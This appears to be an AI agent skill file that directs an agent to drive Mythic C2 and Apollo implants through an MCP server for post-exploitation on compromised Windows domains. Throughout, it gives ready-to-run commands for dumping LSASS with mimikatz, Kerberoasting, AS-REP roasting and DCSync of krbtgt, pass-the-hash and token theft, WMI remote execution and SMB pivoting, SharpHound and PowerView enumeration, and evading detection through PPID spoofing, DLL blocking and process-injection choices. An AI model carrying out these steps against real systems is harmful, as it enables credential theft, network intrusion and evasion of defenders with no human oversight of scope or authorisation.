---
name: mythic-apollo
description: Use when operating Mythic C2 callbacks or Apollo implants for post-exploitation tasks.
---

# Mythic + Apollo Post-Exploitation

## Orientation (do this first)

1. `get_callbacks()` — list active callbacks, note display IDs
2. `whoami(callback_id)` — confirm user context
3. `pwd(callback_id)` / `ls(callback_id)` — confirm working directory
4. `ps(callback_id)` — survey running processes, identify security products
5. `ifconfig(callback_id)` / `netstat(callback_id)` — map network position

Every implant command takes `callback_id` — the display ID from `get_callbacks`.

## Typed Tools vs Generic Execute

The MCP server exposes **48 tools**: 47 typed tools for common operations, plus a generic `execute()` for everything else. Apollo has **73+ commands** total.

For commands without a dedicated tool, use `execute()`:
```
execute(callback_id, command="dcsync", arguments={"domain": "domain.local", "user": "krbtgt"})
execute(callback_id, command="shell", arguments="ipconfig /all")
execute(callback_id, command="socks", arguments="7000")
```

Read `docs/apollo/commands/<command>.md` for args and usage.

### Commands only available via execute()

| Category | Commands |
|----------|----------|
| Injection | `inject`, `assembly_inject`, `psinject`, `keylog_inject`, `screenshot_inject` |
| Execution | `shell`, `run`, `execute_coff`, `execute_pe`, `inline_assembly` |
| C2/Pivoting | `link`, `unlink`, `socks`, `spawn`, `sleep`, `exit` |
| Credential | `dcsync`, `ticket_cache_*`, `ticket_store_*` |
| Evasion | `ppid`, `blockdlls`, `get_injection_techniques` |
| Service/Other | `sc`, `kill`, `listpipes`, `load`, `register_coff`, `register_file`, `mkdir`, `mv`, `rm`, `screenshot` |

## Credential Access

**Dump LSASS** (requires SYSTEM or SeDebugPrivilege):
```
getprivs(callback_id)
mimikatz(callback_id, commands="token::elevate sekurlsa::logonpasswords")
```

**Kerberoast** (requires domain user creds):
```
rubeus_kerberoast(callback_id, cred_user="DOMAIN\\user", cred_password="pass")
```

**AS-REP Roast** / **DCSync**:
```
rubeus_asreproast(callback_id)
execute(callback_id, command="dcsync", arguments={"domain": "domain.local", "user": "krbtgt"})
```

## Lateral Movement

**Token manipulation flow**:
1. `pth(...)` or `make_token(...)` — get a token
2. `steal_token(callback_id, pid=<spawned_pid>)` — impersonate it
3. Do lateral work (WMI, file access, etc.)
4. `rev2self(callback_id)` — revert when done

**WMI execution** on remote host:
```
wmiexecute(callback_id, command="cmd.exe /c whoami", host="target", username="admin", password="pass", domain="DOMAIN")
```

**P2P agent linking** (SMB/TCP pivots):
```
execute(callback_id, command="link", arguments={"host": "target.domain.local", "payload": "Apollo_SMB.exe"})
```

## AD Enumeration

**PowerView** (auto-uploads and imports PowerView.ps1):
```
powerview(callback_id, command="Get-DomainUser -AdminCount")
powerview(callback_id, command="Get-DomainComputer -Unconstrained")
```

**SharpHound** (auto-uploads, runs, downloads results):
```
sharphound_and_download(callback_id, domain="domain.local")
```

**Network enumeration**:
```
net_dclist(callback_id, domain="domain.local")
net_localgroup(callback_id, computer="TARGET01")
net_localgroup_member(callback_id, group="Administrators", computer="TARGET01")
net_shares(callback_id, computer="TARGET01")
```

## Execution Choices

| Method | OPSEC | When to use |
|--------|-------|-------------|
| `powerpick` | Better | Unmanaged runspace, no `powershell.exe` |
| `powershell` | Worse | When you need a full PowerShell session |
| `execute_assembly` | Good | In-memory .NET, no disk writes |
| `execute(command="shell")` | Worst | Only for simple one-liners, spawns `cmd.exe` |

Register assemblies first: `register_assembly(callback_id, filename="Seatbelt.exe")`

## OPSEC

Read the full guides at `docs/apollo/opsec/`.

**Fork-and-run commands** spawn a sacrificial process (Process Create + Inject + Kill artifacts):
`execute_assembly`, `mimikatz`, `powerpick`, `printspoofer`, `pth`, `dcsync`, `spawn`, `execute_pe`

**Change sacrificial process** (default `rundll32.exe` is suspicious):
```
spawnto_x64(callback_id, application="C:\\Windows\\System32\\svchost.exe")
```

**Change parent PID** / **Block non-MS DLLs** / **Set injection technique**:
```
execute(callback_id, command="ppid", arguments="<explorer_pid>")
execute(callback_id, command="blockdlls", arguments="")
set_injection_technique(callback_id, technique="NtCreateThreadEx")
```

Apollo supports: CreateRemoteThread, QueueUserAPC (early bird), NtCreateThreadEx (syscalls). QueueUserAPC is incompatible with some inject commands.

## Server-Side Operations

```
upload_file(filepath="/local/tool.exe", reupload=False)   # upload to Mythic server
check_file(filename="tool.exe")                           # verify file on server
download_file(filename="loot.zip")                        # download from server
```
